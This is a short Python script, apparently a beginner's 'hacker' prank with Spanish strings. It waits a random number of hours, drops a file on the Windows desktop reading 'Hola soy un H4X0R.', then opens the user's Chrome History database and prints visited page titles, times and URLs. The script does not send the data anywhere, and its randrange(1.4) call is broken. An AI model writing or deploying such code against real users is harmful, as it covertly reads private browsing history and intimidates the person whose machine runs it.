import os
from time import sleep
from random import randrange
import sqlite3

def main():
    n_hours = randrange(1.4)
    print("Durmiendo {}".format(n_hours))
    sleep(n_hours * 60 * 60)

    user_path = "C:\\Users\\" + os.getlogin()
    desktop_windows_path = user_path + "\\Desktop\\"

    with open(desktop_windows_path + "PARA TI.txt", "w") as hacker_file:
        hacker_file.write("Hola soy un H4X0R.")


    history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
    connection = sqlite3.connect(history_path)
    cursor = connection.cursor()
    cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
    urls = cursor.fetchall()
    print(urls)

if __name__ == "__main__":
    main()